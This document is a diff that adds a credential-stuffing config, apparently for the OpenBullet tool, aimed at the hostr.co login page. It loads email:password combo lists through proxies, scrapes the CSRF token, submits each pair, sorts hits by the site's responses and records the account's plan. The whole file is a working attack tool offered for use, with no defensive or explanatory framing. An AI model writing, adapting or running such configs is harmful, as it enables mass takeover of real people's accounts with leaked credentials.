@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "hostr.co",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-30T22:51:26.4774383+00:00",
+  "AdditionalInfo": "",
+  "Author": "Doberman",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://hostr.co/signin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#TOKEN PARSE "<SOURCE>" LR "name=\"_csrf\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST REQUEST POST "https://hostr.co/signin" AutoRedirect=TRUE 
+  CONTENT "_csrf=<TOKEN>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login details" 
+    KEY "Data must be a string or a buffer" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://hostr.co/" 
+PARSE "<SOURCE>" LR "plan: \"" "\"" Recursive=FALSE -> CAP "Plan" "" "" 
